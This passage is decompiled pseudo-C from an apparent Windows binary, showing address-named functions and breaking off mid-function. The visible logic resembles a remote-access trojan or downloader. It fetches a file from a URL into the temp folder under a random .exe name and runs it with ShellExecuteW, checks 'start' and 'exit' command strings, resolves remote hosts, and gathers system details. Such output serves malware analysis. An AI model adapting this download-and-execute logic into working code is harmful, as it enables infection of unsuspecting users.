    int32_t dwSize; // 0x4034d1
    int32_t v1 = *(int32_t *)(dwSize + 4); // 0x4034d7
    function_404094(dwSize + 12);
    int32_t lpAddress = function_415e92(); // 0x4034f7
    function_415ede(&g18);
    if (*(char *)(dwSize + 8) == 0) {
        // 0x40351f
        function_409bff(v1);
    } else {
        // 0x403518
        function_409cef(v1);
    }
    // 0x403524
    VirtualFree((int32_t *)lpAddress, dwSize, 0x4000);
    return function_404081();
}

// Address range: 0x40353f - 0x403556
int32_t function_40353f(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = &g133; // bp-8, 0x403547
    return function_405f32(&v1);
}

// Address range: 0x403556 - 0x40358c
int32_t function_403556(int32_t a1, int32_t a2, int32_t a3) {
    // 0x403556
    int32_t result; // 0x403556
    int32_t v1; // 0x403556
    if (*(int32_t *)(v1 + 4) == 0) {
        // 0x403562
        function_404656(v1 + 8);
        ShellExecuteW(NULL, L"open", (int16_t *)v1, NULL, NULL, 5);
        result = function_406f1d();
    }
    // 0x403589
    return result;
}

// Address range: 0x40358c - 0x4035c9
int32_t function_40358c(int32_t a1) {
    int32_t v1 = a1;
    int32_t v2; // bp-12, 0x40358c
    function_406d2f(&v2);
    int32_t v3 = *(int32_t *)function_40456d(&v1); // 0x4035af
    function_412ba8(v3, *(int32_t *)(a1 + 4));
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x4035c9 - 0x4035cc
int32_t function_4035c9(void) {
    // 0x4035c9
    int32_t result; // 0x4035c9
    return result;
}

// Address range: 0x4035cc - 0x40365e
int32_t function_4035cc(int32_t a1) {
    // 0x4035cc
    int128_t v1; // 0x4035cc
    int128_t v2 = v1;
    int32_t cp = a1;
    int32_t v3; // bp-16, 0x4035cc
    function_406d2f(&v3);
    function_40456d(&cp);
    function_406f1d();
    int32_t v4 = cp; // bp-68, 0x4035fa
    int32_t v5 = inet_addr((char *)cp); // 0x4035fd
    int32_t v6 = v5; // 0x403606
    int32_t v7 = v3; // 0x403606
    int32_t * v8 = &v4; // 0x403606
    if (v5 == -1) {
        int32_t v9 = cp; // bp-84, 0x403624
        int128_t v10 = __asm_xorps(v2, v2); // 0x403627
        int64_t v11; // 0x4035cc
        __asm_movlpd(v11, v10);
        __asm_movlpd(v11, v10);
        getaddrinfo(NULL, (char *)&g322, (struct addrinfo *)&g322, (struct addrinfo **)&g322);
        v6 = *(int32_t *)(*(int32_t *)24 + 4);
        v7 = 0;
        v8 = &v9;
    }
    int32_t v12 = (int32_t)v8;
    *(int32_t *)(v12 - 4) = v6;
    *(int32_t *)(v12 - 8) = *(int32_t *)(a1 + 4);
    *(int32_t *)(v12 - 16) = v7;
    function_4180c4((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    return function_406f1d();
}

// Address range: 0x40365e - 0x403661
int32_t function_40365e(void) {
    // 0x40365e
    int32_t result; // 0x40365e
    return result;
}

// Address range: 0x403661 - 0x40366b
int32_t function_403661(void) {
    // 0x403661
    return function_410c8a();
}

// Address range: 0x40366b - 0x4036cd
int32_t function_40366b(int32_t a1) {
    // 0x40366b
    function_410c8a();
    int32_t v1; // bp-16, 0x40366b
    function_406d2f(&v1);
    function_40434f("127.0.0.2");
    int32_t v2; // bp-40, 0x40366b
    int32_t v3 = &v2; // bp-52, 0x4036af
    function_40456d(&v3);
    int32_t v4; // 0x40366b
    function_410cce(v4, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    return function_406f1d();
}

// Address range: 0x4036cd - 0x4036d8
int32_t function_4036cd(void) {
    // 0x4036cd
    int32_t v1; // 0x4036cd
    return function_4120e9(v1, v1);
}

// Address range: 0x4036d8 - 0x4036df
int32_t function_4036d8(void) {
    // 0x4036d8
    int32_t v1; // 0x4036d8
    return function_40bd1d(v1);
}

// Address range: 0x4036df - 0x4036ea
int32_t function_4036df(void) {
    // 0x4036df
    int32_t v1; // 0x4036df
    return function_40bd63(v1, 0);
}

// Address range: 0x4036ea - 0x4037d5
int32_t function_4036ea(int32_t a1) {
    int32_t v1 = a1;
    function_413915();
    function_4043fa((int16_t *)&g17);
    function_4042c5(function_4044c4());
    function_406f1d();
    int32_t v2 = a1 + 4; // 0x403730
    function_404656(v2);
    int32_t v3 = function_40453a(&v1); // 0x403740
    function_4042c5(v3);
    function_406f1d();
    v1 = 0;
    function_406f1d();
    function_404656(v2);
    int32_t v4; // 0x4036ea
    int16_t * v5 = (int16_t *)v4; // 0x403772
    int32_t v6 = 0; // bp-76, 0x403776
    int32_t v7 = URLDownloadToFileW(NULL, (int16_t *)v1, v5, 0, NULL); // 0x403777
    function_406f1d();
    int32_t * v8 = &v6; // 0x403789
    if (v7 == 0) {
        int32_t v9 = 0; // bp-100, 0x4037a0
        ShellExecuteW(NULL, L"open", v5, NULL, NULL, 5);
        v8 = &v9;
    }
    int32_t v10 = &g57; // bp-20, 0x4037b9
    *(int32_t *)((int32_t)v8 - 4) = (int32_t)&v10;
    function_405f32((int32_t *)v10);
    return function_406f1d();
}

// Address range: 0x4037d5 - 0x4037dd
int32_t function_4037d5(void) {
    // 0x4037d5
    int32_t v1; // 0x4037d5
    return function_410249(v1);
}

// Address range: 0x4037dd - 0x4037e6
int32_t function_4037dd(void) {
    // 0x4037dd
    int32_t v1; // 0x4037dd
    return function_4179b8(v1);
}

// Address range: 0x4037e6 - 0x403978
int32_t function_4037e6(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4037e6
    int32_t v1; // 0x4037e6
    int32_t v2 = v1 + 8; // 0x4037fb
    function_404656(v2);
    int32_t v3 = function_4045f0(); // 0x403807
    function_406f1d();
    int32_t v4; // 0x4037e6
    int32_t v5; // bp-592, 0x4037e6
    if (v3 != 0) {
        // 0x403865
        function_404656(v2);
        int32_t v6; // bp-12, 0x4037e6
        int32_t v7 = &v6; // 0x403871
        v5 = v7;
        function_4043c7(v7);
        function_406f1d();
        v4 = &v5;
    } else {
        // 0x40381a
        v5 = 260;
        int32_t lpBuffer; // bp-564, 0x4037e6
        GetTempPathW(260, (int16_t *)&lpBuffer);
        int32_t v8 = function_40460a((int16_t *)&lpBuffer); // 0x403836
        function_4043c7(v8);
        function_406f1d();
        function_404477(*(int32_t *)(v1 + 4));
        int16_t * v9 = L".exe"; // bp-608, 0x403857
        function_4043fa(L".exe");
        v4 = (int32_t)&v9;
    }
    int32_t * v10 = (int32_t *)(v1 + 12); // 0x403884
    int32_t * v11 = (int32_t *)(v4 - 4);
    if (*v10 == 0) {
        // 0x403889
        *v11 = 0;
        function_413c34((int32_t)&g322);
    }
    // 0x4038ba
    *v11 = 0;
    *(int32_t *)(v4 - 8) = 0;
    function_413fdb((int32_t)&g322, (int32_t)&g322);
    *(int32_t *)(v4 - 12) = 0;
    bool v12 = PathFileExistsW((int16_t *)&g322); // 0x4038f2
    int32_t v13; // bp-40, 0x4037e6
    int32_t v14 = &v13; // 0x4038f8
    *(int32_t *)(v4 - 16) = v14;
    int32_t v15 = v4 - 20;
    int32_t * v16 = (int32_t *)v15;
    int32_t v17; // 0x4037e6
    if (v12) {
        // 0x403908
        *v16 = 0x40000000;
        v17 = function_413f4f((int32_t)&g322);
    } else {
        // 0x4038fd
        *v16 = v14;
        v17 = function_413f8e();
    }
    int32_t v18 = v15; // 0x403917
    if (v17 != 0) {
        // 0x403919
        *(int32_t *)(v4 - 24) = v1 + 24;
        function_404094((int32_t)&g322);
        int32_t v19; // bp-16, 0x4037e6
        int32_t v20 = &v19; // 0x403925
        *(int32_t *)(v4 - 28) = v20;
        v18 = v4 - 32;
        *(int32_t *)v18 = v20;
        function_413ef9((int32_t)&g322);
        function_404081();
        function_413ee1();
    }
    // 0x403942
    if (*(char *)(v1 + 20) == 0) {
        // 0x403963
        function_413c16();
        return function_406f1d();
    }
    // 0x403948
    if (*v10 == *(int32_t *)(v1 + 16)) {
        // 0x403950
        *(int32_t *)(v18 - 4) = 5;
        *(int32_t *)(v18 - 8) = 0;
        *(int32_t *)(v18 - 12) = 0;
        *(int32_t *)(v18 - 16) = 0;
        *(int32_t *)(v18 - 20) = (int32_t)L"open";
        *(int32_t *)(v18 - 24) = 0;
        ShellExecuteW(&g322, (int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322);
    }
    // 0x403963
    function_413c16();
    return function_406f1d();
}

// Address range: 0x403978 - 0x40397f
int32_t function_403978(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x403978
    return function_4155e3();
}

// Address range: 0x40397f - 0x4039a2
int32_t function_40397f(void) {
    int32_t v1 = &g130; // bp-12, 0x40398c
    function_405f32(&v1);
    return function_41739a();
}

// Address range: 0x4039a2 - 0x4039b9
int32_t function_4039a2(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = &g66; // bp-8, 0x4039aa
    return function_405f32(&v1);
}

// Address range: 0x4039b9 - 0x4039be
int32_t function_4039b9(void) {
    // 0x4039b9
    return function_4163bc();
}

// Address range: 0x4039be - 0x4039ca
int32_t function_4039be(void) {
    // 0x4039be
    int32_t v1; // 0x4039be
    return function_4163f3(v1, *(int32_t *)(v1 + 4));
}

// Address range: 0x4039ca - 0x403a14
int32_t function_4039ca(void) {
    // 0x4039ca
    int32_t v1; // bp-20, 0x4039ca
    function_416265(&v1);
    function_401419(&v1);
    function_405f32((int32_t *)function_4057a8());
    function_401460();
    return function_401460();
}

// Address range: 0x403a14 - 0x403a31
int32_t function_403a14(void) {
    // 0x403a14
    function_4013d7();
    int32_t v1; // 0x403a14
    return function_409796(v1, *(int32_t *)(v1 + 4), 1);
}

// Address range: 0x403a31 - 0x403ac2
int32_t function_403a31(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = function_40434f("start"); // 0x403a45
    int32_t v2; // 0x403a31
    if (function_404333(v1) != 0) {
        // 0x403a56
        if (g158 == 0) {
            // 0x403a65
            function_406f1d();
            // 0x403abd
            return function_412b3b(v2);
        }
    }
    // 0x403a63
    function_406f1d();
    int32_t v3 = function_404333(function_40434f("exit")); // 0x403a89
    function_406f1d();
    int32_t result; // 0x403a31
    if (v3 == 0) {
        // 0x403aaf
        function_404385(v2 + 4);
        result = function_412a57((int32_t)&g322);
    } else {
        // 0x403a9c
        g158 = 0;
        result = function_412798();
    }
    // 0x403abd
    return result;
}

// Address range: 0x403ac2 - 0x403b17
int32_t function_403ac2(void) {
    // 0x403ac2
    int32_t v1; // 0x403ac2
    int32_t errorCode; // 0x403ac2
    if (function_414ac7() == 0) {
        // 0x403ae6
        int32_t v2; // 0x403ac2
        v1 = *(int32_t *)(v2 + 4);
        errorCode = GetLastError();
    } else {
        // 0x403adb
        function_403cc8();
        errorCode = 0;
    }
    // 0x403aee
    function_414a4a(v1);
    int32_t v3 = function_4053c5(errorCode, (int32_t)&g322); // 0x403afd
    function_405f32((int32_t *)v3);
    return function_4053ae();
}

// Address range: 0x403b17 - 0x403bb2
int32_t function_403b17(int32_t a1, int32_t a2, int32_t a3) {
    // 0x403b17
    SetLastError(0);
    int32_t v1; // 0x403b17
    int32_t v2 = v1 + 4; // 0x403b2e
    int32_t v3 = v2; // bp-8, 0x403b34
    function_404656(v2);
    int32_t v4 = function_413c34((int32_t)&g322); // 0x403b3c
    GetLastError();
    int32_t v5; // 0x403b17
    int32_t v6; // 0x403b17
    int32_t v7; // 0x403b17
    int32_t * v8; // 0x403b17
    if (v4 == 0) {
        int32_t errorCode = GetLastError(); // 0x403b80
        v5 = v2;
        int32_t v9; // bp-44, 0x403b17
        v8 = &v9;
        v7 = v3;
        v6 = errorCode;
    } else {
        // 0x403b4e
        function_404656(v2);
        int32_t v10 = &v3; // 0x403b60
        int32_t v11 = v10; // bp-56, 0x403b60
        function_404656(v10);
        function_404a12((int32_t)&g322);
        function_406f1d();
        function_4049fb();
        int32_t v12; // bp-20, 0x403b17
        v5 = &v12;
        v8 = &v11;
        v7 = v2;
        v6 = 0;
    }
    int32_t v13 = (int32_t)v8;
    *(int32_t *)(v13 - 4) = v5;
    *(int32_t *)(v13 - 8) = v7;
    function_404656((int32_t)&g322);
    *(int32_t *)(v13 - 12) = v6;
    int32_t v14 = function_405045((int32_t)&g322, (int32_t)&g322); // 0x403b98
    *(int32_t *)(v13 - 16) = v14;
    function_405f32(&g322);
    return function_40502e();
}

// Address range: 0x403bb2 - 0x403c13
int32_t function_403bb2(void) {
    // 0x403bb2
    int32_t v1; // 0x403bb2
    int32_t v2 = v1 + 8; // 0x403bc2
    function_404656(v2);
    function_413c83((int32_t)&g322);
    int32_t v3; // bp-20, 0x403bb2
    function_40153f(&v3);
    function_404656(v2);
    int32_t v4 = function_404c2d(*(int32_t *)(v1 + 4), (int32_t)&g322); // 0x403bf1
    function_405f32((int32_t *)v4);
    function_404c0e();
    return function_401586();
}

// Address range: 0x403c13 - 0x403c2a
int32_t function_403c13(void) {
    // 0x403c13
    function_4013d7();
    int32_t v1; // 0x403c13
    return function_4098eb(v1, v1);
}

// Address range: 0x403c2a - 0x403c7f
int32_t function_403c2a(void) {
    // 0x403c2a
    int32_t v1; // 0x403c2a
    function_404656(v1 + 4);
    function_413c83((int32_t)&g322);
    int32_t v2; // bp-20, 0x403c2a
    function_40153f(&v2);
    function_405f32((int32_t *)function_4054ba());
    function_401586();
    return function_401586();
}

// Address range: 0x403c7f - 0x403cc8
int32_t function_403c7f(void) {
    // 0x403c7f
    int32_t v1; // 0x403c7f
    function_413da4(v1);
    int32_t v2; // bp-20, 0x403c7f
    function_4014dd(&v2);
    function_405f32((int32_t *)function_40558e());
    function_401524();
    return function_401524();
}

// Address range: 0x403cc8 - 0x403d11
int32_t function_403cc8(void) {
    // 0x403cc8
    int32_t v1; // 0x403cc8
    function_414af5(v1);
    int32_t v2; // bp-20, 0x403cc8
    function_40147b(&v2);
    function_405f32((int32_t *)function_40567d());
    function_4014c2();
    return function_4014c2();
}

// Address range: 0x403d11 - 0x403e6b
int32_t function_403d11(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x403d11
    int32_t v1; // 0x403d11
    function_4135d1(v1, v1, v1);
    function_4134a0();
    int32_t lpFilename; // bp-352, 0x403d11
    GetModuleFileNameA(NULL, (char *)&lpFilename, 260);
    function_415e27();
    int32_t v2; // bp-20, 0x403d11
    int32_t v3 = &v2; // bp-904, 0x403d5f
    v2 = 0;
    function_415b64(0x10ad, &v2);
    function_4136a5();
    int32_t v4 = function_4138ef(); // 0x403d76
    int32_t v5 = function_413893(); // 0x403d7e
    int32_t v6 = function_4136c8(); // 0x403d85
    function_40460a((int16_t *)v1);
    int32_t v7 = &v3; // bp-912, 0x403d99
    function_40460a((int16_t *)v1);
    int32_t v8 = &v7; // bp-928, 0x403da8
    function_40460a((int16_t *)&g15);
    int32_t v9 = &v8; // bp-936, 0x403db5
    function_4139ad();
    function_4139e7(&v9, &v9, 303, v6, v5, v4);
    int32_t v10 = function_4052bc((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x403dd3
    function_405f32((int32_t *)v10);
    function_40527a();
    if (*(int32_t *)(v1 + 60) != 0) {
        // 0x403df5
        int32_t lpString1; // bp-872, 0x403d11
        function_401293(&lpString1, 0, 520);
        SHGetFolderPathW(NULL, 28, NULL, 0, (int16_t *)&lpString1);
        lstrcatW((int16_t *)&lpString1, (int16_t *)&g16);
        CreateDirectoryW((int16_t *)&lpString1, NULL);
        function_40bd63(v1, 1);
        int32_t v11 = &g133; // bp-16, 0x403e47
        function_405f32(&v11);
    }
    // 0x403e56
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x403e6b - 0x403e73
int32_t function_403e6b(void) {
    // 0x403e6b
    int32_t v1; // 0x403e6b
    return *(int32_t *)(v1 + 4);
}

// Address range: 0x403e73 - 0x403e83
int32_t function_403e73(int32_t a1) {
    // 0x403e73
    int32_t v1; // 0x403e73
    return (int32_t)*(char *)(v1 + a1);
}

// Address range: 0x403e83 - 0x403eca
int32_t function_403e83(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t result = (int32_t)a1;
    int32_t v1 = function_406f77(); // 0x403e8d
    function_40126d((int32_t *)v1, (int32_t *)(a3 + a2), a3);
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    function_403fc7(v1, a3);
    function_406f66();
    return result;
}

// Address range: 0x403eca - 0x403f05
int32_t function_403eca(int32_t a1) {
    // 0x403eca
    int32_t result; // 0x403eca
    int32_t * v1 = (int32_t *)result; // 0x403ed4
    *v1 = 0;
    int32_t * v2 = (int32_t *)(result + 4); // 0x403ed7
    *v2 = 0;
    int32_t * v3 = (int32_t *)(a1 + 4); // 0x403edb
    if (*v3 != 0) {
        int32_t v4 = function_406f77(); // 0x403ee2
        *v1 = v4;
        function_40126d((int32_t *)v4, (int32_t *)*(int32_t *)a1, *v3);
        *v2 = *v3;
    }
    // 0x403efd
    return result;
}

// Address range: 0x403f05 - 0x403f58
int32_t function_403f05(int32_t result) {
    // 0x403f05
    int32_t v1; // 0x403f05
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x403f0c
    int32_t v3 = function_401000(2 * *v2 + 2); // 0x403f17
    int32_t v4 = *v2 + 2; // 0x403f21
    int32_t * v5 = (int32_t *)v3; // 0x403f28
    function_401293(v5, 0, v4);
    function_40126d(v5, (int32_t *)v4, *v2);
    function_40460a((int16_t *)v3);
    if (v3 != 0) {
        // 0x403f48
        function_401014(v3);
    }
    // 0x403f4f
    return result;
}

// Address range: 0x403f58 - 0x403fa3
int32_t function_403f58(int32_t result) {
    // 0x403f58
    int32_t v1; // 0x403f58
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x403f5f
    int32_t v3 = function_401000(*v2 + 1); // 0x403f64
    int32_t v4 = *v2 + 1; // 0x403f6e
    int32_t * v5 = (int32_t *)v3; // 0x403f73
    function_401293(v5, 0, v4);
    function_40126d(v5, (int32_t *)v4, *v2);
    function_40434f((char *)v3);
    if (v3 != 0) {
        // 0x403f93
        function_401014(v3);
    }
    // 0x403f9a
    return result;
}

// Address range: 0x403fa3 - 0x403fb5
int32_t function_403fa3(void) {
    // 0x403fa3
    int32_t v1; // 0x403fa3
    return function_403fc7((int32_t)&v1, 8);
}

// Address range: 0x403fb5 - 0x403fc7
int32_t function_403fb5(void) {
    // 0x403fb5
    int32_t v1; // 0x403fb5
    return function_403fc7((int32_t)&v1, 4);
}

// Address range: 0x403fc7 - 0x403ffa
int32_t function_403fc7(int32_t a1, int32_t a2) {
    int32_t v1 = function_406f3d(); // 0x403fd8
    int32_t v2; // 0x403fc7
    int32_t * v3 = (int32_t *)(v2 + 4); // 0x403fdd
    *(int32_t *)v2 = v1;
    int32_t result = function_40126d((int32_t *)(*v3 + v1), (int32_t *)a1, a2); // 0x403fe9
    *v3 = *v3 + a2;
    return result;
}

// Address range: 0x403ffa - 0x404011
int32_t function_403ffa(void) {
    // 0x403ffa
    int32_t result; // 0x403ffa
    int32_t v1; // 0x403ffa
    if (v1 != 0) {
        // 0x404003
        result = function_406f66();
    }
    // 0x404008
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x404011 - 0x40403b
int32_t function_404011(int32_t a1) {
    // 0x404011
    int32_t result; // 0x404011
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    int32_t v1 = function_404314(); // 0x404024
    function_403fc7(*(int32_t *)a1, v1);
    return result;
}

// Address range: 0x40403b - 0x404065
int32_t function_40403b(int32_t a1) {
    // 0x40403b
    int32_t result; // 0x40403b
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    int32_t v1 = function_404302(); // 0x40404e
    function_403fc7(*(int32_t *)a1, v1);
    return result;
}

// Address range: 0x404065 - 0x40406f
int32_t function_404065(void) {
    // 0x404065
    int32_t result; // 0x404065
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    return result;
}

// Address range: 0x40406f - 0x404072
int32_t function_40406f(void) {
    // 0x40406f
    int32_t result; // 0x40406f
    return result;
}

// Address range: 0x404072 - 0x404081
int32_t function_404072(int32_t a1) {
    // 0x404072
    int32_t v1; // 0x404072
    return *(int32_t *)(v1 + a1);
}

// Address range: 0x404081 - 0x404094
int32_t function_404081(void) {
    // 0x404081
    int32_t result; // 0x404081
    int32_t v1; // 0x404081
    if (v1 != 0) {
        // 0x40408a
        result = function_406f66();
    }
    // 0x40408f
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x404094 - 0x4040c4
int32_t function_404094(int32_t a1) {
    int32_t v1 = function_406f77(); // 0x4040a1
    int32_t result; // 0x404094
    *(int32_t *)result = v1;
    int32_t * v2 = (int32_t *)(a1 + 4); // 0x4040a8
    function_40126d((int32_t *)v1, (int32_t *)*(int32_t *)a1, *v2);
    *(int32_t *)(result + 4) = *v2;
    return result;
}

// Address range: 0x4040c4 - 0x4040d5
int32_t function_4040c4(void) {
    // 0x4040c4
    int32_t lpString; // 0x4040c4
    if (lpString == 0) {
        // 0x4040d2
        return 0;
    }
    // 0x4040c9
    return lstrlenA((char *)lpString);
}

// Address range: 0x4040d5 - 0x40415d
int32_t function_4040d5(int32_t * a1) {
    // 0x4040d5
    *a1 = 0;
    if (function_4040c4() >= 1) {
        int32_t v1 = function_4040c4(); // 0x4040f2
        int32_t v2; // 0x4040d5
        char * lpMultiByteStr = (char *)v2; // 0x4040fd
        int32_t cchWideChar = 2 * MultiByteToWideChar(0, 2, lpMultiByteStr, v1 + 2, NULL, 0); // 0x40410a
        int32_t v3 = function_401000(cchWideChar); // 0x40410d
        function_4040c4();
        int16_t * lpWideCharStr = (int16_t *)v3; // 0x404121
        MultiByteToWideChar(0xfde9, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);
        function_4043c7(function_40460a(lpWideCharStr));
        function_406f1d();
        function_401014(v3);
    }
    // 0x404154
    return (int32_t)a1;
}

// Address range: 0x40415d - 0x404197
int32_t function_40415d(int32_t a1) {
    // 0x40415d
    function_406f1d();
    int32_t result; // 0x40415d
    int32_t * v1 = (int32_t *)result; // 0x40416e
    *v1 = 0;
    int32_t * lpString2 = (int32_t *)a1; // 0x404171
    if (*lpString2 != 0) {
        // 0x404176
        function_404302();
        int32_t lpString1 = function_406e8d(); // 0x40417f
        *v1 = lpString1;
        lstrcatA((char *)lpString1, (char *)*lpString2);
    }
    // 0x40418f
    return result;
}

// Address range: 0x404197 - 0x4041c2
int32_t function_404197(void) {
    // 0x404197
    function_4041c2(function_40434f("\r\n"));
    function_406f1d();
    int32_t result; // 0x404197
    return result;
}

// Address range: 0x4041c2 - 0x4041fb
int32_t function_4041c2(int32_t a1) {
    // 0x4041c2
    function_4040c4();
    function_4040c4();
    int32_t lpString1 = function_406ebe(); // 0x4041e4
    int32_t v1; // 0x4041c2
    *(int32_t *)v1 = lpString1;
    int32_t lpString2 = *(int32_t *)a1; // 0x4041eb
    return (int32_t)lstrcatA((char *)lpString1, (char *)lpString2);
}

// Address range: 0x4041fb - 0x404201
int32_t function_4041fb(void) {
    // 0x4041fb
    int32_t result; // 0x4041fb
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x404201 - 0x40424e
int32_t function_404201(void) {
    // 0x404201
    int32_t lpDst; // bp-1028, 0x404201
    function_401293(&lpDst, 0, 1024);
    int32_t lpSrc; // 0x404201
    ExpandEnvironmentStringsW((int16_t *)lpSrc, (int16_t *)&lpDst, 511);
    function_40460a((int16_t *)&lpDst);
    return lpSrc;
}

// Address range: 0x40424e - 0x404276
int32_t function_40424e(int32_t result) {
    // 0x40424e
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    int32_t v1; // 0x40424e
    function_403fc7(v1, function_404314());
    return result;
}

// Address range: 0x404276 - 0x40428f
int32_t function_404276(int32_t a1) {
    int32_t lpString2 = *(int32_t *)a1; // 0x40427c
    int32_t lpString1; // 0x404276
    return lstrcmpW((int16_t *)lpString1, (int16_t *)lpString2) == 0;
}

// Address range: 0x40428f - 0x4042c5
int32_t function_40428f(int32_t a1) {
    // 0x40428f
    int32_t result; // 0x40428f
    if (result != 0) {
        // 0x40429b
        function_406f1d();
        *(int32_t *)result = 0;
    }
    // 0x4042a3
    function_4042c5(function_40460a((int16_t *)a1));
    function_406f1d();
    return result;
}

// Address range: 0x4042c5 - 0x404302
int32_t function_4042c5(int32_t a1) {
    // 0x4042c5
    function_4045f0();
    function_4045f0();
    int32_t lpString1 = function_406ebe(); // 0x4042eb
    int32_t v1; // 0x4042c5
    *(int32_t *)v1 = lpString1;
    int32_t lpString2 = *(int32_t *)a1; // 0x4042f2
    return (int32_t)lstrcatW((int16_t *)lpString1, (int16_t *)lpString2);
}

// Address range: 0x404302 - 0x404314
int32_t function_404302(void) {
    // 0x404302
    int32_t lpString; // 0x404302
    if (lpString == 0) {
        // 0x404311
        return 0;
    }
    // 0x404307
    return lstrlenA((char *)lpString) + 1;
}

// Address range: 0x404314 - 0x40432c
int32_t function_404314(void) {
    // 0x404314
    int32_t lpString; // 0x404314
    if (lpString != 0) {
        // 0x40431c
        return 2 * lstrlenW((int16_t *)lpString) + 2;
    }
    // 0x404319
    return 0;
}

// Address range: 0x40432c - 0x404333
int32_t function_40432c(void) {
    // 0x40432c
    return function_406f1d();
}

// Address range: 0x404333 - 0x40434c
int32_t function_404333(int32_t a1) {
    int32_t lpString2 = *(int32_t *)a1; // 0x404339
    int32_t lpString1; // 0x404333
    return lstrcmpA((char *)lpString1, (char *)lpString2) == 0;
}

// Address range: 0x40434c - 0x40434f
int32_t function_40434c(void) {
    // 0x40434c
    int32_t result; // 0x40434c
    return result;
}

// Address range: 0x40434f - 0x404385
int32_t function_40434f(char * lpString) {
    // 0x40434f
    int32_t result; // 0x40434f
    if (lstrlenA(lpString) >= 1) {
        // 0x404362
        lstrlenA(lpString);
        int32_t lpString1 = function_406e8d(); // 0x40436d
        char * lpString2; // bp-20, 0x40434f
        *(int32_t *)&lpString2 = (int32_t)lpString;
        *(int32_t *)result = lpString1;
        lstrcpyA((char *)lpString1, lpString2);
    }
    // 0x40437e
    return result;
}

// Address range: 0x404385 - 0x4043b8
int32_t function_404385(int32_t a1) {
    // 0x404385
    int32_t result; // 0x404385
    int32_t * v1 = (int32_t *)result; // 0x40438f
    *v1 = 0;
    int32_t * lpString2 = (int32_t *)a1; // 0x404392
    if (*lpString2 != 0) {
        // 0x404397
        function_404302();
        int32_t lpString1 = function_406f2c(); // 0x4043a0
        *v1 = lpString1;
        lstrcpyA((char *)lpString1, (char *)*lpString2);
    }
    // 0x4043b0
    return result;
}

// Address range: 0x4043b8 - 0x4043c7
int32_t function_4043b8(void) {
    int32_t result = function_406f1d(); // 0x4043bd
    int32_t v1; // 0x4043b8
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x4043c7 - 0x4043fa
int32_t function_4043c7(int32_t a1) {
    // 0x4043c7
    int32_t result; // 0x4043c7
    int32_t * v1 = (int32_t *)result; // 0x4043d1
    *v1 = 0;
    int32_t * lpString2 = (int32_t *)a1; // 0x4043d4
    if (*lpString2 != 0) {
        // 0x4043d9
        function_404314();
        int32_t lpString1 = function_406e8d(); // 0x4043e2
        *v1 = lpString1;
        lstrcpyW((int16_t *)lpString1, (int16_t *)*lpString2);
    }
    // 0x4043f2
    return result;
}

// Address range: 0x4043fa - 0x404422
int32_t function_4043fa(int16_t * a1) {
    // 0x4043fa
    function_4042c5(function_40460a(a1));
    function_406f1d();
    int32_t result; // 0x4043fa
    return result;
}

// Address range: 0x404422 - 0x404462
int32_t function_404422(char * a1) {
    char * v1 = a1;
    function_40434f(a1);
    int32_t v2 = function_4040d5((int32_t *)&v1); // 0x40443a
    function_4042c5(v2);
    function_406f1d();
    v1 = NULL;
    function_406f1d();
    int32_t result; // 0x404422
    return result;
}

// Address range: 0x404462 - 0x404477
int32_t function_404462(int32_t a1) {
    // 0x404462
    function_4042c5(a1);
    int32_t result; // 0x404462
    return result;
}

// Address range: 0x404477 - 0x4044c4
int32_t function_404477(int32_t a1) {
    int32_t v1 = a1;
    int32_t lpOut; // bp-524, 0x404477
    wsprintfW((int16_t *)&lpOut, L"%d");
    function_40460a((int16_t *)&lpOut);
    function_4042c5((int32_t)&v1);
    function_406f1d();
    int32_t result; // 0x404477
    return result;
}

// Address range: 0x4044c4 - 0x40453a
int32_t function_4044c4(void) {
    // 0x4044c4
    int32_t result; // 0x4044c4
    *(int32_t *)result = 0;
    int32_t v1 = function_401000(result); // 0x4044db
    function_401293((int32_t *)v1, 0, result);
    int32_t v2; // bp-56, 0x4044c4
    __asm_rep_movsd_memcpy((char *)&v2, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...", 10);
    int32_t v3; // bp-68, 0x4044c4
    int32_t v4 = &v3; // 0x404501
    int32_t v5 = result - 1; // 0x404502
    int32_t * v6; // 0x4044c4
    if (v5 == 0) {
        // 0x4044c4
        v6 = (int32_t *)(v4 - 4);
    } else {
        int32_t * v7 = (int32_t *)(v4 - 4);
        int32_t v8; // bp-4, 0x4044c4
        int32_t v9 = (int32_t)&v8 - 52;
        int32_t v10 = 0; // 0x404519
        int32_t v11 = function_401032(); // 0x404507
        *v7 = 40;
        char v12 = *(char *)(v9 + (int32_t)((0x100000000 * (int64_t)(v11 >> 31) | (int64_t)v11) % 40)); // 0x404512
        *(char *)(v10 + v1) = v12;
        v10++;
        v6 = v7;
        while (v10 != v5) {
            // 0x404507
            v11 = function_401032();
            *v7 = 40;
            v12 = *(char *)(v9 + (int32_t)((0x100000000 * (int64_t)(v11 >> 31) | (int64_t)v11) % 40));
            *(char *)(v10 + v1) = v12;
            v10++;
            v6 = v7;
        }
    }
